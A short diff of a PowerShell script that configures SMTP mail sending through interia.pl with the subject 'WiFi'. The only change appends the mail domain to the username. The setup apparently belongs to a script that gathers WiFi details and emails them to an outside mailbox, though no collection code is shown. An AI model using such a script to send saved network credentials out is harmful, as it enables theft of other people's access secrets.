@@ -1,6 +1,7 @@
 $SmtpServer = "poczta.interia.pl" ; $SmtpPort = "587"
 $secpasswd = ConvertTo-SecureString $Password -AsPlainText -Force
-$cred1 = New-Object System.Management.Automation.PSCredential ($username, $secpasswd)
+$user = $username + "@interia.pl"
+$cred1 = New-Object System.Management.Automation.PSCredential ($user, $secpasswd)
 $Subject = "WiFi"
 
 $p = @()
